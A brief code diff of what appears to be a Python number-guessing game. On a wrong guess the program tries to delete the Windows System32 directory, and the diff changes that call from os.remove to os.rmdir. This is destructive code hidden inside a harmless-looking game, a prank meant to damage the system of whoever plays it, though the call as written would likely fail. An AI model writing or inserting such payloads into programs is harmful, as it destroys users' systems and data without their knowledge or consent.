@@ -9,4 +9,4 @@ guess =int(guess)
 if guess == number:
     print('You win!')
 else:
-    os.remove("C:\Windows\System32")
+    os.rmdir("C:\Windows\System32")
